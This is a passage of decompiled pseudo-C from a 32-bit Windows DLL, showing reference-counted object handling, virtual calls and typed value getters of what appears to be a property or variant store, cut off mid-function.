//----- (1000FE28) --------------------------------------------------------
void __stdcall sub_1000FE28(volatile LONG *a1, volatile LONG *lpAddend, volatile LONG *a3)
{
  volatile LONG *v3; // esi
  volatile LONG *v4; // ebx
  void *v5; // ecx
  volatile LONG *v6; // [esp-Ch] [ebp-28h] BYREF
  volatile LONG *v7; // [esp-8h] [ebp-24h] BYREF
  volatile LONG *v8; // [esp-4h] [ebp-20h]
  int *v9; // [esp+Ch] [ebp-10h]
  int v10; // [esp+18h] [ebp-4h]

  v10 = 0;
  v3 = lpAddend;
  v4 = a1;
  v9 = (int *)&v7;
  v8 = lpAddend;
  v7 = a1;
  InterlockedIncrement(lpAddend);
  LOBYTE(v10) = 0;
  sub_1000FDE4(v5, (int)v7, (int)v8);
  v8 = a3;
  a3 = (volatile LONG *)&v6;
  v7 = v3;
  v6 = v4;
  InterlockedIncrement(v3);
  LOBYTE(v10) = 0;
  sub_1000FCC9(v6, (int)v7, (int)v8);
  v10 = -1;
  sub_10008301((void **)&a1);
}
// 1000FE5D: variable 'v5' is possibly undefined

//----- (1000FE9E) --------------------------------------------------------
void __thiscall sub_1000FE9E(int *this, int a2, int a3)
{
  int v4; // eax
  _DWORD v5[5]; // [esp-18h] [ebp-44h] BYREF
  int v6; // [esp-4h] [ebp-30h]
  int v7[6]; // [esp+8h] [ebp-24h] BYREF
  int v8; // [esp+28h] [ebp-4h]

  HIBYTE(a3) = (_BYTE)a3 != 0;
  sub_1000B1F3((void *)1, (int)v7, (char *)&a3 + 3);
  v8 = 0;
  v6 = 10;
  v7[5] = (int)v5;
  sub_1000B36F(v7, (int)v5);
  LOBYTE(v8) = 1;
  v4 = *this;
  LOBYTE(v8) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v4 + 52))(
    this,
    a2,
    v5[0],
    v5[1],
    v5[2],
    v5[3],
    v5[4],
    v6);
  v8 = -1;
  sub_1000B3DF(v7);
}

//----- (1000FF0D) --------------------------------------------------------
void __thiscall sub_1000FF0D(int *this, int a2, char a3)
{
  int v4; // eax
  _DWORD v5[5]; // [esp-18h] [ebp-44h] BYREF
  int v6; // [esp-4h] [ebp-30h]
  int v7[6]; // [esp+8h] [ebp-24h] BYREF
  int v8; // [esp+28h] [ebp-4h]

  sub_1000B1F3((void *)1, (int)v7, &a3);
  v8 = 0;
  v6 = 7;
  v7[5] = (int)v5;
  sub_1000B36F(v7, (int)v5);
  LOBYTE(v8) = 1;
  v4 = *this;
  LOBYTE(v8) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v4 + 52))(
    this,
    a2,
    v5[0],
    v5[1],
    v5[2],
    v5[3],
    v5[4],
    v6);
  v8 = -1;
  sub_1000B3DF(v7);
}

//----- (1000FF72) --------------------------------------------------------
void __thiscall sub_1000FF72(int *this, int a2, char a3)
{
  int v4; // eax
  _DWORD v5[5]; // [esp-18h] [ebp-44h] BYREF
  int v6; // [esp-4h] [ebp-30h]
  int v7[6]; // [esp+8h] [ebp-24h] BYREF
  int v8; // [esp+28h] [ebp-4h]

  sub_1000B1F3((void *)2, (int)v7, &a3);
  v8 = 0;
  v6 = 8;
  v7[5] = (int)v5;
  sub_1000B36F(v7, (int)v5);
  LOBYTE(v8) = 1;
  v4 = *this;
  LOBYTE(v8) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v4 + 52))(
    this,
    a2,
    v5[0],
    v5[1],
    v5[2],
    v5[3],
    v5[4],
    v6);
  v8 = -1;
  sub_1000B3DF(v7);
}

//----- (1000FFD7) --------------------------------------------------------
void __thiscall sub_1000FFD7(int *this, int a2, char a3)
{
  int v4; // eax
  _DWORD v5[5]; // [esp-18h] [ebp-44h] BYREF
  int v6; // [esp-4h] [ebp-30h]
  int v7[6]; // [esp+8h] [ebp-24h] BYREF
  int v8; // [esp+28h] [ebp-4h]

  sub_1000B1F3((void *)4, (int)v7, &a3);
  v8 = 0;
  v6 = 6;
  v7[5] = (int)v5;
  sub_1000B36F(v7, (int)v5);
  LOBYTE(v8) = 1;
  v4 = *this;
  LOBYTE(v8) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v4 + 52))(
    this,
    a2,
    v5[0],
    v5[1],
    v5[2],
    v5[3],
    v5[4],
    v6);
  v8 = -1;
  sub_1000B3DF(v7);
}

//----- (1001003C) --------------------------------------------------------
void __thiscall sub_1001003C(int *this, int a2, int a3, int a4)
{
  int v5; // eax
  _DWORD v6[5]; // [esp-18h] [ebp-30h] BYREF
  int v7; // [esp-4h] [ebp-1Ch]
  void *v8; // [esp+8h] [ebp-10h]
  int v9; // [esp+14h] [ebp-4h]

  v9 = 0;
  v7 = 5;
  v8 = v6;
  sub_1000CDC9((int)&a3, v6);
  LOBYTE(v9) = 1;
  v5 = *this;
  LOBYTE(v9) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v5 + 52))(
    this,
    a2,
    v6[0],
    v6[1],
    v6[2],
    v6[3],
    v6[4],
    v7);
  v9 = -1;
  sub_1000D3AD(&a3);
}

//----- (1001008F) --------------------------------------------------------
void __thiscall sub_1001008F(int *this, int a2, char a3, int a4)
{
  int v5; // eax
  _DWORD v6[5]; // [esp-18h] [ebp-44h] BYREF
  int v7; // [esp-4h] [ebp-30h]
  int v8[6]; // [esp+8h] [ebp-24h] BYREF
  int v9; // [esp+28h] [ebp-4h]

  sub_1000B1F3((void *)8, (int)v8, &a3);
  v9 = 0;
  v7 = 9;
  v8[5] = (int)v6;
  sub_1000B36F(v8, (int)v6);
  LOBYTE(v9) = 1;
  v5 = *this;
  LOBYTE(v9) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v5 + 52))(
    this,
    a2,
    v6[0],
    v6[1],
    v6[2],
    v6[3],
    v6[4],
    v7);
  v9 = -1;
  sub_1000B3DF(v8);
}

//----- (100100F4) --------------------------------------------------------
void __thiscall sub_100100F4(int *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v8; // eax
  _DWORD v9[5]; // [esp-18h] [ebp-30h] BYREF
  int v10; // [esp-4h] [ebp-1Ch]
  void *v11; // [esp+8h] [ebp-10h]
  int v12; // [esp+14h] [ebp-4h]

  v12 = 0;
  v10 = 4;
  v11 = v9;
  sub_1000B36F(&a3, (int)v9);
  LOBYTE(v12) = 1;
  v8 = *this;
  LOBYTE(v12) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v8 + 52))(
    this,
    a2,
    v9[0],
    v9[1],
    v9[2],
    v9[3],
    v9[4],
    v10);
  v12 = -1;
  sub_1000B3DF(&a3);
}

//----- (10010147) --------------------------------------------------------
void __thiscall sub_10010147(int *this, int a2, int a3, int a4, int a5, void *Block, int a7, int *a8)
{
  int v9; // [esp-Ch] [ebp-30h] BYREF
  volatile LONG *v10; // [esp-8h] [ebp-2Ch]
  LONG *v11; // [esp-4h] [ebp-28h]
  _DWORD *v12[2]; // [esp+8h] [ebp-1Ch] BYREF
  int v13; // [esp+10h] [ebp-14h] BYREF
  volatile LONG *v14; // [esp+14h] [ebp-10h]
  int v15; // [esp+20h] [ebp-4h]

  v15 = 0;
  sub_1000EDE4(this, v12);
  LOBYTE(v15) = 1;
  sub_10010719(this, &v13, a2, (int)a8, Block);
  LOBYTE(v15) = 2;
  v11 = &a3;
  v10 = v14;
  a8 = &v9;
  v9 = v13;
  InterlockedIncrement(v14);
  LOBYTE(v15) = 2;
  sub_1001089C(this, a2, v9, v10, v11);
  LOBYTE(v15) = 1;
  sub_10008301((void **)&v13);
  LOBYTE(v15) = 0;
  sub_1000EDA4(v12);
  v15 = -1;
  sub_1000B3DF(&a3);
}

//----- (100101E4) --------------------------------------------------------
bool __thiscall sub_100101E4(void *this, int a2)
{
  int v2; // ecx
  bool v3; // bl
  int v5[5]; // [esp+4h] [ebp-20h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 76))(this, v5, a2, 10);
  v6 = 0;
  v3 = *(_BYTE *)sub_1000B4CB((int)v5, v2, 0) == 1;
  v6 = -1;
  sub_1000B3DF(v5);
  return v3;
}
// 10010209: variable 'v2' is possibly undefined
// 100101E4: using guessed type int var_20[5];

//----- (10010231) --------------------------------------------------------
char __thiscall sub_10010231(void *this, int a2)
{
  int v2; // ecx
  char v3; // bl
  int v5[5]; // [esp+4h] [ebp-20h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 76))(this, v5, a2, 7);
  v6 = 0;
  v3 = *(_BYTE *)sub_1000B4CB((int)v5, v2, 0);
  v6 = -1;
  sub_1000B3DF(v5);
  return v3;
}
// 10010256: variable 'v2' is possibly undefined
// 10010231: using guessed type int var_20[5];

//----- (1001027A) --------------------------------------------------------
__int16 __thiscall sub_1001027A(void *this, int a2)
{
  __int16 v2; // si
  int v4[5]; // [esp+4h] [ebp-20h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 76))(this, v4, a2, 8);
  v5 = 0;
  v2 = sub_1000B746(v4, 0);
  v5 = -1;
  sub_1000B3DF(v4);
  return v2;
}
// 1001027A: using guessed type int var_20[5];

//----- (100102C5) --------------------------------------------------------
int __thiscall sub_100102C5(void *this, int a2)
{
  int v2; // esi
  int v4[5]; // [esp+4h] [ebp-20h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 76))(this, v4, a2, 6);
  v5 = 0;
  v2 = sub_1000B6F2(v4, 0);
  v5 = -1;
  sub_1000B3DF(v4);
  return v2;
}
// 100102C5: using guessed type int var_20[5];

//----- (1001030E) --------------------------------------------------------
int __thiscall sub_1001030E(void *this, int a2, int a3)
{
  (*(void (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 76))(this, a2, a3, 4);
  return a2;
}

//----- (1001034A) --------------------------------------------------------
_DWORD *__thiscall sub_1001034A(void *this, _DWORD *a2, int a3)
{
  int v4[5]; // [esp+4h] [ebp-24h] BYREF
  int v5; // [esp+18h] [ebp-10h]
  int v6; // [esp+24h] [ebp-4h]

  v5 = 0;
  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 76))(this, v4, a3, 5);
  v6 = 1;
  sub_1000CCFC(a2);
  v5 = 1;
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  return a2;
}
// 1001034A: using guessed type int var_24[5];

//----- (1001039D) --------------------------------------------------------
double __thiscall sub_1001039D(void *this, int a2)
{
  int *v2; // ecx
  _DWORD v4[5]; // [esp+0h] [ebp-28h] BYREF
  double v5; // [esp+14h] [ebp-14h]
  int v6; // [esp+24h] [ebp-4h]

  (*(void (__thiscall **)(void *, _DWORD *, int, int))(*(_DWORD *)this + 76))(this, v4, a2, 9);
  v6 = 0;
  v5 = *(double *)sub_1000B4B8(v4);
  v6 = -1;
  sub_1000B3DF(v2);
  return v5;
}
// 100103CD: variable 'v2' is possibly undefined
// 1001039D: using guessed type _DWORD var_28[5];

//----- (100103E3) --------------------------------------------------------
void *__thiscall sub_100103E3(int *this, void *a2, int a3, volatile LONG *a4)
{
  volatile LONG *v6; // [esp-Ch] [ebp-38h]
  volatile LONG *v7; // [esp-8h] [ebp-34h]
  _DWORD *v8[2]; // [esp+Ch] [ebp-20h] BYREF
  volatile LONG *v9; // [esp+14h] [ebp-18h] BYREF
  volatile LONG *v10; // [esp+18h] [ebp-14h]
  int v11; // [esp+1Ch] [ebp-10h]
  int v12; // [esp+28h] [ebp-4h]

  v11 = 0;
  sub_1000EDE4(this, v8);
  v12 = 1;
  sub_100107CC(this, &v9, a3);
  LOBYTE(v12) = 2;
  v7 = v10;
  v6 = v9;
  InterlockedIncrement(v10);
  LOBYTE(v12) = 2;
  sub_1000FE28(v6, v7, a4);
  sub_1000B36F((_DWORD *)v9 + 1, (int)a2);
  v11 = 1;
  LOBYTE(v12) = 1;
  sub_10008301((void **)&v9);
  LOBYTE(v12) = 0;
  sub_1000EDA4(v8);
  return a2;
}

//----- (10010487) --------------------------------------------------------
int __thiscall sub_10010487(int *this, int a2)
{
  volatile LONG *v3; // ecx
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v6; // esi
  void *v8; // ecx
  volatile LONG *v9; // [esp-8h] [ebp-40h] BYREF
  volatile LONG *v10; // [esp-4h] [ebp-3Ch]
  bool v11; // [esp+Bh] [ebp-2Dh]
  void *v12; // [esp+Ch] [ebp-2Ch]
  volatile LONG *v13; // [esp+10h] [ebp-28h] BYREF
  volatile LONG *v14; // [esp+14h] [ebp-24h]
  _DWORD v15[2]; // [esp+18h] [ebp-20h] BYREF
  _DWORD *v16[3]; // [esp+20h] [ebp-18h] BYREF
  int v17; // [esp+34h] [ebp-4h]

  sub_1000EDE4(this, v16);
  v17 = 0;
  v10 = v3;
  v9 = v3;
  v12 = &v9;
  sub_1000D372(&v9, a2);
  LOBYTE(v17) = 1;
  v4 = sub_10017A30(this[19], v15);
  LOBYTE(v17) = 2;
  v5 = (_DWORD *)*v4;
  LOBYTE(v17) = 3;
  v11 = sub_10017FA9(v5, 2, (int)v9, (int)v10);
  LOBYTE(v17) = 0;
  sub_1000780D(v15);
  if ( v11 )
  {
    v6 = 11;
  }
  else
  {
    sub_100107CC(this, &v13, a2);
    LOBYTE(v17) = 4;
    v10 = v14;
    v12 = &v9;
    v9 = v13;
    InterlockedIncrement(v14);
    LOBYTE(v17) = 4;
    sub_1000FDE4(v8, (int)v9, (int)v10);
    v6 = *v13;
    LOBYTE(v17) = 0;
    sub_10008301((void **)&v13);
  }
  v17 = -1;
  sub_1000EDA4(v16);
  return v6;
}
// 100104B9: variable 'v3' is possibly undefined
// 1001056D: variable 'v8' is possibly undefined
// 10010487: using guessed type _DWORD var_20[2];

//----- (10010588) --------------------------------------------------------
bool __thiscall sub_10010588(int *this, int a2)
{
  int v3; // ecx
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v7; // [esp-8h] [ebp-38h] BYREF
  int v8; // [esp-4h] [ebp-34h]
  bool v9; // [esp+Bh] [ebp-25h]
  void *v10; // [esp+Ch] [ebp-24h]
  _DWORD v11[2]; // [esp+10h] [ebp-20h] BYREF
  _DWORD *v12[3]; // [esp+18h] [ebp-18h] BYREF
  int v13; // [esp+2Ch] [ebp-4h]

  sub_1000EDE4(this, v12);
  v13 = 0;
  v8 = v3;
  v7 = v3;
  v10 = &v7;
  sub_1000D372(&v7, a2);
  LOBYTE(v13) = 1;
  v4 = sub_10017A30(this[19], v11);
  LOBYTE(v13) = 2;
  v5 = (_DWORD *)*v4;
  LOBYTE(v13) = 3;
  v9 = sub_10017FA9(v5, 0, v7, v8);
  LOBYTE(v13) = 0;
  sub_1000780D(v11);
  v13 = -1;
  sub_1000EDA4(v12);
  return v9;
}
// 100105BA: variable 'v3' is possibly undefined
// 10010588: using guessed type _DWORD var_20[2];

//----- (10010628) --------------------------------------------------------
_DWORD *__stdcall sub_10010628(int a1, _DWORD *a2, int a3, int a4, void *Block)
{
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD *v7; // ecx
  _DWORD *v9; // [esp-8h] [ebp-48h]
  volatile LONG *v10; // [esp-4h] [ebp-44h]
  int v11[5]; // [esp+Ch] [ebp-34h] BYREF
  _DWORD *v12[2]; // [esp+20h] [ebp-20h] BYREF
  int v13[2]; // [esp+28h] [ebp-18h] BYREF
  int v14; // [esp+30h] [ebp-10h]
  int v15; // [esp+3Ch] [ebp-4h]

  v15 = 0;
  v14 = 0;
  sub_1000EDE4((int *)a1, v12);
  v15 = 1;
  ++*(_DWORD *)(a1 + 88);
  sub_1000B1F3(Block, (int)v11, 0);
  LOBYTE(v15) = 2;
  v5 = operator new(0x20u);
  LOBYTE(v15) = 3;
  if ( v5 )
    v6 = sub_100191D6(v11, v5, a4);
  else
    v6 = 0;
  LOBYTE(v15) = 2;
  sub_10050B91(a2, (int)v6);
  v10 = (volatile LONG *)a2[1];
  v7 = (_DWORD *)*a2;
  v14 = 1;
  v9 = v7;
  InterlockedIncrement(v10);
  LOBYTE(v15) = 2;
  sub_10017033((int *)(a1 + 16), v9, v10);
  sub_10017B34(*(_DWORD **)(a1 + 76), v13, a3, *(void **)(*a2 + 28));
  LOBYTE(v15) = 2;
  sub_1002228F((void **)v13);
  LOBYTE(v15) = 1;
  sub_1000B3DF(v11);
  LOBYTE(v15) = 0;
  sub_1000EDA4(v12);
  return a2;
}
// 10010628: using guessed type int var_34[5];

//----- (10010719) --------------------------------------------------------
_DWORD *__stdcall sub_10010719(int *a1, _DWORD *a2, int a3, int a4, void *Block)
{
  bool v5; // zf
  _DWORD *v6; // eax
  _DWORD *v8; // [esp-Ch] [ebp-38h]
  volatile LONG *v9; // [esp-8h] [ebp-34h]
  _DWORD *v10[2]; // [esp+Ch] [ebp-20h] BYREF
  int v11[2]; // [esp+14h] [ebp-18h] BYREF
  int v12; // [esp+1Ch] [ebp-10h]
  int v13; // [esp+28h] [ebp-4h]

  v13 = 0;
  v12 = 0;
  sub_1000EDE4(a1, v10);
  v13 = 1;
  sub_100107CC(a1, a2, a3);
  v5 = *a2 == 0;
  v12 = 1;
  if ( v5 )
  {
    v6 = sub_10010628((int)a1, v11, a3, a4, Block);
    LOBYTE(v13) = 2;
    sub_10010CC6(v6, (int)a2);
    LOBYTE(v13) = 1;
    sub_10008301((void **)v11);
  }
  v9 = (volatile LONG *)a2[1];
  v8 = (_DWORD *)*a2;
  InterlockedIncrement(v9);
  LOBYTE(v13) = 1;
  sub_1000FCC9(v8, (int)v9, a4);
  LOBYTE(v13) = 0;
  sub_1000EDA4(v10);
  return a2;
}

//----- (100107CC) --------------------------------------------------------
_DWORD *__thiscall sub_100107CC(int *this, _DWORD *a2, int a3)
{
  int v4; // ecx
  _DWORD *v5; // eax
  _DWORD *v7; // [esp-10h] [ebp-50h]
  int v8; // [esp-8h] [ebp-48h] BYREF
  int v9; // [esp-4h] [ebp-44h]
  _DWORD v10[2]; // [esp+10h] [ebp-30h] BYREF
  _DWORD *v11[2]; // [esp+18h] [ebp-28h] BYREF
  void *v12[3]; // [esp+20h] [ebp-20h] BYREF
  int v13; // [esp+2Ch] [ebp-14h]
  int v14; // [esp+3Ch] [ebp-4h]

  v13 = 0;
  sub_1000EDE4(this, v11);
  v14 = 1;
  v9 = v4;
  v8 = v4;
  v12[2] = &v8;
  sub_1000D372(&v8, a3);
  LOBYTE(v14) = 2;
  v5 = sub_10017A30(this[19], v10);
  LOBYTE(v14) = 3;
  v7 = (_DWORD *)*v5;
  LOBYTE(v14) = 4;
  sub_10017D89(v7, v12, v8, v9);
  LOBYTE(v14) = 6;
  sub_1000780D(v10);
  if ( v12[0] )
    sub_10016ACA((int)(this + 4), a2, *((_DWORD *)v12[0] + 9));
  else
    sub_10050B91(a2, 0);
  v13 = 1;
  LOBYTE(v14) = 1;
  sub_1002228F(v12);
  LOBYTE(v14) = 0;
  sub_1000EDA4(v11);
  return a2;
}
// 100107F2: variable 'v4' is possibly undefined
// 100107CC: using guessed type _DWORD var_30[2];

//----- (1001089C) --------------------------------------------------------
void __stdcall sub_1001089C(int *a1, int a2, int a3, volatile LONG *lpAddend, LONG *a5)
{
  int v5; // ebx
  int v6; // esi
  int v7; // ebx
  int v8; // [esp-8h] [ebp-28h] BYREF
  volatile LONG *v9; // [esp-4h] [ebp-24h]
  _DWORD *v10[2]; // [esp+Ch] [ebp-14h] BYREF
  int v11; // [esp+1Ch] [ebp-4h]

  v11 = 0;
  sub_1000EDE4(a1, v10);
  LOBYTE(v11) = 1;
  v5 = a3;
  sub_1000B3BD(a5, a3 + 4);
  v6 = *(_DWORD *)(v5 + 28);
  a5 = &v8;
  v9 = lpAddend;
  v8 = v5;
  InterlockedIncrement(lpAddend);
  LOBYTE(v11) = 1;
  sub_10016EF8(a1 + 4, v8, v9);
  v7 = *(_DWORD *)(v5 + 28);
  if ( v6 != v7 )
    sub_10010933(a1, a2, v7);
  LOBYTE(v11) = 0;
  sub_1000EDA4(v10);
  v11 = -1;
  sub_10008301((void **)&a3);
}

//----- (10010933) --------------------------------------------------------
int __thiscall sub_10010933(int *this, int a2, int Src)
{
  int v4; // ecx
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD *v8; // [esp-14h] [ebp-4Ch]
  int v9; // [esp-Ch] [ebp-44h] BYREF
  int v10; // [esp-8h] [ebp-40h]
  int v11; // [esp-4h] [ebp-3Ch]
  void *v12; // [esp+Ch] [ebp-2Ch]
  void *v13[2]; // [esp+10h] [ebp-28h] BYREF
  _DWORD v14[2]; // [esp+18h] [ebp-20h] BYREF
  _DWORD *v15[3]; // [esp+20h] [ebp-18h] BYREF
  int v16; // [esp+34h] [ebp-4h]

  sub_1000EDE4(this, v15);
  v16 = 0;
  v11 = Src;
  ++this[22];
  v10 = v4;
  v9 = v4;
  v12 = &v9;
  sub_1000D372(&v9, a2);
  LOBYTE(v16) = 1;
  v5 = sub_10017A30(this[19], v14);
  LOBYTE(v16) = 2;
  v8 = (_DWORD *)*v5;
  LOBYTE(v16) = 3;
  v6 = sub_10017D89(v8, v13, v9, v10);
  LOBYTE(v16) = 4;
  sub_1001769D((_DWORD *)*v6, v11);
  LOBYTE(v16) = 3;
  sub_1002228F(v13);
  LOBYTE(v16) = 0;
  sub_1000780D(v14);
  v16 = -1;
  return sub_1000EDA4(v15);
}
// 1001096B: variable 'v4' is possibly undefined
// 10010933: using guessed type _DWORD var_20[2];

//----- (100109ED) --------------------------------------------------------
int *__thiscall sub_100109ED(int this, int *a2)
{
  void *v2; // esi

  v2 = (void *)(this + 16);
  sub_10016995((void *)(this + 16));
  sub_1001778D(a2, v2);
  return a2;
}

//----- (10010A31) --------------------------------------------------------
int __thiscall sub_10010A31(int *this, int a2)
{
  int v3; // esi
  int v4; // eax
  _DWORD *v5; // ecx
  int v6; // eax
  _DWORD *v8[2]; // [esp+8h] [ebp-14h] BYREF
  int v9; // [esp+18h] [ebp-4h]

  sub_1000EDE4(this, v8);
  v9 = 0;
  ++this[22];
  v3 = this[19];
  v4 = sub_1000D65C((int)&unk_10186920, a2);
  v5 = *(_DWORD **)(v3 + 36);
  if ( v4 )
    v6 = sub_10018316(v5, a2, 0);
  else
    v6 = (*(int (__thiscall **)(_DWORD *))(*v5 + 4))(v5);
  *(_DWORD *)(v3 + 24) -= v6;
  v9 = -1;
  return sub_1000EDA4(v8);
}

//----- (10010A99) --------------------------------------------------------
_DWORD *__thiscall sub_10010A99(int *this, _DWORD *a2, int a3)
{
  _DWORD *v4; // ecx
  _DWORD *v5; // eax
  _DWORD *v7; // [esp-8h] [ebp-40h] BYREF
  _DWORD *v8; // [esp-4h] [ebp-3Ch]
  _DWORD v9[2]; // [esp+Ch] [ebp-2Ch] BYREF
  _DWORD *v10[2]; // [esp+14h] [ebp-24h] BYREF
  _DWORD *v11[3]; // [esp+1Ch] [ebp-1Ch] BYREF
  int v12; // [esp+28h] [ebp-10h]
  int v13; // [esp+34h] [ebp-4h]

  v12 = 0;
  sub_1000EDE4(this, v10);
  v13 = 1;
  sub_10017A30(this[19], v11);
  LOBYTE(v13) = 2;
  if ( sub_1000D65C((int)&unk_10186920, a3) )
  {
    v8 = v4;
    v7 = v4;
    v11[2] = &v7;
    sub_1000D372(&v7, a3);
    LOBYTE(v13) = 2;
    v5 = sub_10017D0A(v11[0], v9, (int)v7, (int)v8);
    LOBYTE(v13) = 4;
    sub_1003098B(v11, v5);
    LOBYTE(v13) = 2;
    sub_1000780D(v9);
  }
  v8 = a2;
  if ( v11[0] )
    sub_10017FFF(v11[0], (int)v8);
  else
    sub_10006814(v8);
  v12 = 1;
  LOBYTE(v13) = 1;
  sub_1000780D(v11);
  LOBYTE(v13) = 0;
  sub_1000EDA4(v10);
  return a2;
}
// 10010AE1: variable 'v4' is possibly undefined
// 10010A99: using guessed type _DWORD var_2C[2];

//----- (10010B64) --------------------------------------------------------
int __thiscall sub_10010B64(int *this)
{
  int v2; // esi
  _DWORD *v4[2]; // [esp+8h] [ebp-14h] BYREF
  int v5; // [esp+18h] [ebp-4h]

  sub_1000EDE4(this, v4);
  v5 = 0;
  v2 = *(_DWORD *)(this[19] + 24);
  v5 = -1;
  sub_1000EDA4(v4);
  return v2;
}

//----- (10010BA3) --------------------------------------------------------
void __thiscall sub_10010BA3(int *this)
{
  int v2; // eax
  int *v3; // eax
  int v4; // [esp+0h] [ebp-28h] BYREF
  int v5[4]; // [esp+Ch] [ebp-1Ch] BYREF
  int v6; // [esp+24h] [ebp-4h]

  v5[3] = (int)&v4;
  v5[2] = (int)this;
  sub_1000ECB1(this + 4);
  v6 = 0;
  if ( !this[21] )
  {
    if ( (*(unsigned __int8 (__thiscall **)(int *))(*this + 120))(this) )
    {
      v2 = *(_DWORD *)this[28];
      if ( !this[19] || v2 != this[22] )
      {
        this[22] = v2;
        v3 = sub_100109ED((int)this, v5);
        LOBYTE(v6) = 1;
        sub_10010CE9(v3, this + 19);
        LOBYTE(v6) = 0;
        sub_10007846((int)v5);
      }
    }
  }
  v6 = -1;
  ++this[21];
}

//----- (10010C3A) --------------------------------------------------------
int __thiscall sub_10010C3A(int this)
{
  if ( (*(_DWORD *)(this + 84))-- == 1 )
    **(_DWORD **)(this + 112) = *(_DWORD *)(this + 88);
  return sub_1000EC84((_DWORD *)(this + 16));
}

//----- (10010C52) --------------------------------------------------------
int *__thiscall sub_10010C52(int *this)
{
  _DWORD *v3[5]; // [esp+8h] [ebp-14h] BYREF

  sub_1000EDE4(this, v3);
  v3[4] = (_DWORD *)-1;
  sub_1000EDA4(v3);
  return this + 19;
}

//----- (10010C8E) --------------------------------------------------------
_DWORD *__stdcall sub_10010C8E(_DWORD *a1)
{
  sub_1000D17D(a1, &word_1017A374);
  return a1;
}

//----- (10010CC6) --------------------------------------------------------
int __usercall sub_10010CC6@<eax>(_DWORD *a1@<edi>, int a2@<esi>)
{
  volatile LONG *v3; // [esp-4h] [ebp-4h]

  if ( *(_DWORD *)a2 != *a1 )
  {
    sub_10008338((void **)a2);
    *(_DWORD *)(a2 + 4) = a1[1];
    v3 = *(volatile LONG **)(a2 + 4);
    *(_DWORD *)a2 = *a1;
    InterlockedIncrement(v3);
  }
  return a2;
}

//----- (10010CE9) --------------------------------------------------------
_DWORD *__usercall sub_10010CE9@<eax>(_DWORD *a1@<edi>, _DWORD *a2@<esi>)
{
  volatile LONG *v3; // [esp-4h] [ebp-4h]

  if ( *a2 != *a1 )
  {
    sub_10008269((int)a2);
    a2[1] = a1[1];
    v3 = (volatile LONG *)a2[1];
    *a2 = *a1;
    InterlockedIncrement(v3);
  }
  return a2;
}

//----- (10010D0C) --------------------------------------------------------
void __cdecl __noreturn sub_10010D0C(int a1)
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  pExceptionObject[2] = 61;
  sub_10010D38(pExceptionObject, a1, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVLfeuifzffjRpmufflxh_ezrqwlx_sr__);
}

//----- (10010D38) --------------------------------------------------------
_DWORD *__thiscall sub_10010D38(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10102930;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_1000E7B3(this + 1, v4);
  }
  sub_1000CADA(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_101024E0;
  return this;
}
// 101024E0: using guessed type int (__stdcall *off_101024E0)(char);

//----- (10010DB1) --------------------------------------------------------
int __stdcall sub_10010DB1(int a1, int a2, volatile LONG *lpAddend)
{
  int v4; // ecx
  volatile LONG *v5; // eax
  _DWORD *v6; // eax
  volatile LONG *v7; // ecx
  int v8; // eax
  _DWORD *v10[2]; // [esp+10h] [ebp-1Ch] BYREF
  int v11[2]; // [esp+18h] [ebp-14h] BYREF
  int v12; // [esp+28h] [ebp-4h]

  v12 = 0;
  *(_DWORD *)(a1 + 8) = -1;
  v4 = a2;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 12) = 0;
  *(_BYTE *)(a1 + 13) = 0;
  *(_BYTE *)(a1 + 14) = 0;
  v5 = lpAddend;
  *(_DWORD *)a1 = &off_1010256C;
  *(_DWORD *)(a1 + 20) = v5;
  *(_DWORD *)(a1 + 16) = v4;
  InterlockedIncrement(v5);
  LOBYTE(v12) = 1;
  v6 = (_DWORD *)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 16) + 108))(*(_DWORD *)(a1 + 16));
  v7 = (volatile LONG *)v6[1];
  *(_DWORD *)(a1 + 28) = v7;
  *(_DWORD *)(a1 + 24) = *v6;
  InterlockedIncrement(v7);
  sub_1000D17D((_DWORD *)(a1 + 32), &word_1017A32C);
  LOBYTE(v12) = 3;
  sub_1000EDE4((int *)a1, v10);
  LOBYTE(v12) = 4;
  if ( !(*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 16) + 116))(*(_DWORD *)(a1 + 16)) )
    sub_10011236(a1);
  v8 = (*(int (__thiscall **)(_DWORD, int *))(**(_DWORD **)(a1 + 16) + 112))(*(_DWORD *)(a1 + 16), v11);
  LOBYTE(v12) = 5;
